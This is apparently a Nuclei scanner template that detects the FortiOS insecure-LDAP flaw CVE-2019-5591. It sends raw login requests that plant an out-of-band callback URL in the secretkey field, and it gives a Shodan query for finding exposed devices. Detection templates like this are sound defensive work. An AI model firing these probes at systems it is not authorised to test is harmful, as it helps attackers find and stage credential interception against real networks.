http:
- matchers:
  - condition: and
    part: body_1
    type: word
    words:
    - name="username"
    - name="secretkey"
  - status:
    - 200
    type: status
  - condition: or
    dsl:
    - contains(body_2, "0")
    - contains(body_2, "1")
    - contains(body_2, "2")
    type: dsl
  - condition: or
    negative: true
    part: body_2
    type: word
    words:
    - ajax=1&username=
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  matchers-condition: and
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /logincheck HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/plain;charset=UTF-8


    ajax=1&username={{username}}&secretkey={{interactsh-url}}

    '
id: CVE-2019-5591
info:
  author: ayewo
  classification:
    cpe: cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-5591
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
  description: 'The FortiGate LDAP configuration was detected to be insecure due to
    missing ca-cert, secure LDAPS, or server-identity-check, potentially exposing
    LDAP communications to credential interception or man-in-the-middle attacks under
    specific network conditions.

    '
  impact: 'Unauthenticated attackers can intercept sensitive information by impersonating
    LDAP servers within the same subnet.

    '
  metadata:
    max-request: 2
    product: fortigate
    shodan-query: cpe:"cpe:2.3:o:fortinet:fortios"
    tags: cve,cve2019,fortinet,ldap,kev,vkev,oast
    vendor: fortinet
  name: FortiOS - Insecure LDAP Configuration Detection
  reference:
  - https://github.com/ayewo/fortios-ldap-mitm-poc-CVE-2019-5591
  - https://www.fortiguard.com/psirt/FG-IR-19-037
  remediation: 'Configure LDAP server settings properly and disable default configurations;
    update to the latest firmware version.

    '
  severity: medium
variables:
  password: '{{rand_text_alphanumeric(12)}}'
  username: '{{rand_text_alpha(10)}}'
